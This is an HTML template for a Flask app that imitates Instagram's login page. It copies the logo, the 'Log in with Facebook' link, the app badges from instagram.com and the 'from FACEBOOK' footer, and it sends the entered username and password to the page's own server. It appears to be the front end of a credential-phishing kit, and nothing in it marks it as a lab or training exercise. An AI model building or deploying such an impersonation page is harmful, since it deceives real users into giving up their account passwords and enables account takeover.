<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Instagram login Form</title>
    <!-- External css -->
    <link rel="stylesheet" href="{{ url_for("static", filename="main.css")}}">
    <!-- Font awesome link -->
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css" >
    <!--Bootstrap class -->
   <!-- CSS -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">

<!-- jQuery and JS bundle w/ Popper.js -->
<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ho+j7jyWK8fNQe+A12Hb8AhRq26LrZ/JpcUGGOn+Y7RsweNrtN/tE3MoK7ZeZDyx" crossorigin="anonymous"></script>

</head>
<body>
    <div id="wrapper">
      <div class="container">
        <div class="phone-app-demo"></div>
        <div class="form-data">
          <form name="sentMessage" id="contactForm" action="/" method="post">
            <div class="logo">
              <h1 class="font-weight-bold">Instagram.</h1>
            </div>
            <input type="text" class="form-control" name="name" placeholder="Phone number, username, or email" required data-validation-required-message="Please enter your email.">
            <input type="text" class="form-control" name="password" placeholder="Password" required data-validation-required-message="Please enter your Instagram Password." >
            <button class="form-btn" type="submit">Log in</button>
            <span class="has-separator">Or</span>
            <a href="{{ url_for("fb")}}" class="facebook-login">
              <i class="fab fa-facebook"></i> Log in with Facebook
            </a>
            <a class="password-reset" href="#">Forgot password?</a>
          </form>
          <div class="get-the-app">
            <span>Get the app</span>
            <div class="badge">
              <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="android App">
              <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="ios app">
            </div>
          </div>
        </div>
      </div>

      <footer>
      <div class="container mb5">
      <h4 class="font-weight-light text-lowercase">from </h4>
      </div>
     <div class="container">
      <h4 class="font-weight-bold">FACEBOOK </h4>
      </div>
      <hr></hr>
        <div class="container">
          <nav class="footer-nav">
            <ul>
             <li><a href="#">About Us</a></li>
              <li><a href="#">Support</a></li>
              <li><a href="#">Jobs</a></li>
              <li><a href="#">Privacy</a></li>
              <li><a href="#">Terms</a></li>
              <li><a href="#">Profiles</a></li>
            </ul>
          </nav>
        </div>
      </footer>
    </div>
</body>
</html>
